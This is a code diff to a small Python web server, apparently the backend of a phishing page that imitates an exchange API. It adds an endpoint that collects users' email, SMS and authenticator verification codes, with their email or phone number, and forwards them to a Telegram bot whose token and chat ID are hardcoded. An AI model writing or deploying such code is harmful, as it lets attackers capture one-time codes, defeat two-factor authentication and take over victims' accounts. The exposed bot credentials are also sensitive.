@@ -4,8 +4,14 @@ import http.server
 import socketserver
 import json
 import os
+import requests
+import urllib.parse
 
 PORT = 5000
+
+# Telegram bot credentials from environment
+TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8437518091:AAH7z8V7cWjJdH0EVFRIMGfHSJAjoD8Cb28')
+TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '587511371')
 
 class MyHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
     def end_headers(self):
@@ -65,9 +71,54 @@ class MyHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
         # Обробляємо POST запити до API
         if self.path.startswith('/bapi/'):
             self._send_json_response({"success": True, "data": {}})
+        elif self.path == '/api/send-code':
+            self._handle_send_code()
         else:
             self._send_json_response({"error": "Method not allowed", "code": 405})
     
+    def _handle_send_code(self):
+        """Обрабатывает отправку кода в Telegram"""
+        try:
+            # Читаем данные запроса
+            content_length = int(self.headers.get('Content-Length', 0))
+            post_data = self.rfile.read(content_length)
+            
+            # Парсим JSON данные
+            data = json.loads(post_data.decode('utf-8'))
+            
+            verification_type = data.get('type', 'unknown')
+            code = data.get('code', '000000')
+            email = data.get('email', '')
+            phone = data.get('phone', '')
+            
+            # Формируем сообщение для Telegram
+            if verification_type == 'email':
+                message = f"📧 Email верификация\n\nEmail: {email}\nКод: {code}\n\n🔒 Автоматически сгенерированный код для аутентификации"
+            elif verification_type == 'sms':
+                message = f"📱 SMS верификация\n\nТелефон: {phone}\nКод: {code}\n\n🔒 Автоматически сгенерированный код для аутентификации"  
+            elif verification_type == 'authenticator':
+                message = f"🔐 Аутентификатор\n\nКод: {code}\n\n🔒 Автоматически сгенерированный код для аутентификации"
+            else:
+                message = f"🔑 Верификация\n\nТип: {verification_type}\nКод: {code}"
+            
+            # Отправляем в Telegram
+            telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+            telegram_data = {
+                'chat_id': TELEGRAM_CHAT_ID,
+                'text': message
+            }
+            
+            response = requests.post(telegram_url, json=telegram_data, timeout=10)
+            
+            if response.status_code == 200:
+                self._send_json_response({"success": True, "message": "Код успешно отправлен"})
+            else:
+                self._send_json_response({"success": False, "error": "Ошибка отправки в Telegram"})
+                
+        except Exception as e:
+            print(f"Ошибка при отправке кода: {e}")
+            self._send_json_response({"success": False, "error": str(e)})
+
     def _send_json_response(self, data):
         """Відправляє JSON відповідь"""
         response = json.dumps(data).encode('utf-8')
